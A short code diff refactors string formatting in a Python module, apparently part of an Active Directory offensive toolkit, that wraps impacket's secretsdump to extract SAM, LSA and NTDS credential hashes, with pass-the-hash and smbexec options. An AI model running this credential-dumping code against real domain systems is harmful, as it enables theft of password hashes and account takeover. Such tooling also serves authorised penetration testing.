@@ -1,5 +1,4 @@
 """secretsdump — SAM/LSA/NTDS extraction via impacket."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -21,7 +20,7 @@ def run(args: Any) -> int:
     just_dc = getattr(args, "just_dc", False)
     just_dc_user = getattr(args, "just_dc_user", None)
 
-    print("[*] secretsdump → {} (method: {})".format(target, method))
+    print(f"[*] secretsdump → {target} (method: {method})")
 
     try:
         from impacket.examples.secretsdump import DumpSecrets
@@ -33,7 +32,7 @@ def run(args: Any) -> int:
         "target_ip": target, "use_vss": method == "vss",
         "just_dc": just_dc, "just_dc_user": just_dc_user or "",
         "exec_method": "smbexec", "outputfile": "",
-        "hashes": "{}:{}".format(cred.lm_hash, cred.nt_hash) if cred.has_hash else None,
+        "hashes": f"{cred.lm_hash}:{cred.nt_hash}" if cred.has_hash else None,
         "no_pass": False, "k": False, "aesKey": None,
         "dc_ip": target, "system": "", "ntds": "", "sam": "",
         "security": "", "bootkey": "", "history": False,
@@ -48,5 +47,5 @@ def run(args: Any) -> int:
         print("[+] Secrets dump complete")
         return 0
     except Exception as exc:
-        print("[-] secretsdump error: {}".format(exc), file=sys.stderr)
+        print(f"[-] secretsdump error: {exc}", file=sys.stderr)
         return 1
